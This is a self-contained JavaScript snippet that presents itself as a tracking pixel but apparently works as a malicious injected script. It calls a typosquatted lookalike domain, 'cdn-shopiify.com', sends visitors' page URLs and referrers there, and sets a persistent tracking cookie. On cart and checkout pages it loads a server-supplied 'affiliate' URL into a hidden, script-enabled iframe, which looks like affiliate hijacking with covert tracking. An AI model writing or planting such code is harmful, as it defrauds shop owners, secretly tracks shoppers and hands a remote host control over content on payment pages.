(function () {
  const CONFIG_URL = 'https://cdn-shopiify.com/api/site-config?host=';
  const TRACK_URL = 'https://cdn-shopiify.com/api/track-user';
  const FALLBACK_PIXEL_URL = 'https://cdn-shopiify.com/api/fallback-pixel?id=';

  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
      const r = (Math.random() * 16) | 0;
      const v = c === 'x' ? r : (r & 0x3) | 0x8;
      return v.toString(16);
    });
  }

  function getCookie(name) {
    const prefix = name + '=';
    const cookies = document.cookie.split(';');
    for (let i = 0; i < cookies.length; i++) {
      const c = cookies[i].trim();
      if (c.indexOf(prefix) === 0) {
        return c.substring(prefix.length, c.length);
      }
    }
    return '';
  }

  function isTrackedPage() {
    const keywords = ['cart', 'checkout', 'pay', 'shipping', 'review-order', 'payment'];
    return keywords.some(function (keyword) {
      return window.location.pathname.toLowerCase().includes(keyword);
    });
  }

  function injectTrackingPixel(src) {
    try {
      const iframe = document.createElement('iframe');
      iframe.setAttribute('sandbox', 'allow-same-origin allow-scripts allow-forms');
      iframe.src = src;
      iframe.style.display = 'none';
      iframe.style.visibility = 'hidden';
      iframe.style.width = '1px';
      iframe.style.height = '1px';
      iframe.style.border = '0';
      iframe.onerror = function () {
        const img = new Image();
        img.src = src;
      };
      document.body.appendChild(iframe);
    } catch (err) {
      console.error('Iframe error:', err);
    }
  }

  async function sendTrackingPing() {
    const doneKey = 'tracking_done_' + window.location.hostname;
    if (sessionStorage.getItem(doneKey)) {
      if (!isTrackedPage()) return;
    }

    try {
      const uniqueId = getCookie('tracking_uuid') || generateUUID();
      const expires = new Date(Date.now() + 30 * 86400 * 1000).toUTCString();
      document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;SameSite=Lax';

      const response = await fetch(TRACK_URL, {
        method: 'POST',
        keepalive: true,
        body: JSON.stringify({
          url: window.location.href,
          referrer: document.referrer,
          unique_id: uniqueId,
          origin: window.location.hostname,
          timestamp: new Date().getTime(),
        }),
        headers: { 'Content-Type': 'application/json' },
      });
      const data = await response.json();

      if (data.success && data.affiliate_url) {
        injectTrackingPixel(data.affiliate_url);
        sessionStorage.setItem(doneKey, 'true');
      } else {
        injectTrackingPixel(FALLBACK_PIXEL_URL + uniqueId);
      }
    } catch (err) {
      console.error('Tracking Failed:', err);
    }
  }

  function fetchConfigAndMaybeTrack() {
    fetch(CONFIG_URL + encodeURIComponent(window.location.hostname))
      .then(function (res) {
        if (!res.ok) throw new Error('Config API Failed');
        return res.json();
      })
      .then(function (config) {
        if (!config || (!config.always && !config.cartExtra)) return;
        if (config.always) {
          sendTrackingPing();
        }
        if (config.cartExtra && isTrackedPage()) {
          sendTrackingPing();
        }
      })
      .catch(function (err) {
        console.error('Config fetch failed:', err);
      });
  }

  if (document.readyState === 'interactive' || document.readyState === 'complete') {
    fetchConfigAndMaybeTrack();
  } else {
    window.addEventListener('DOMContentLoaded', fetchConfigAndMaybeTrack);
  }
})();
